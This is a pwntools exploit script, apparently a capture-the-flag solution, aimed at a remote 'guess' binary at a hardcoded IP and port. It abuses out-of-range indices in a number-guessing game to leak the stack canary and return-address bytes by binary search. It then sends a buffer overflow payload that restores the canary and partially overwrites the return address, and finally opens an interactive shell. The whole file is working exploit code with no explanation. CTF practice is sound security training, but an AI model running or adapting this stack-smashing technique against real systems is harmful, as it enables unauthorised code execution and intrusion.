#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 193.57.159.27 --port 59624 guess
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('guessing/guess')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '193.57.159.27'
port = int(args.PORT or 25021)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

freeleaks = 0

def leak(n):
    lowlim = 0
    highlim = 255
    global freeleaks

    while(True):

        guess = (lowlim + highlim) // 2

        if(highlim - lowlim == 2 and freeleaks == 0):
            freeleaks += 1
            return guess

        io.sendlineafter("Which number are you guessing (0-7)?", str(n))
        io.sendlineafter("Enter your guess:", str(guess))
        res = io.recvuntil("!")

        if b"low" in res:
            lowlim = guess
        elif b"high" in res:
            highlim = guess
        else:
            return guess

io = start()

canary = [
        p8(0x0),
        p8(leak(33)),
        p8(leak(34)),
        p8(leak(35)),
        p8(leak(36)),
        p8(leak(37)),
        p8(leak(38)),
        p8(leak(39)),
        ]

gadget = [
        p8(0x7e),
        p8(leak(49) - 0x70 + 0x6c),
        p8(leak(50) - 0x02 + 0x0e),
        ]

payload = flat({
    0x20-0x8: canary,
    0x20+0x8: gadget,
    })

io.sendafter("So, what did you think of my game?", payload)

io.interactive()

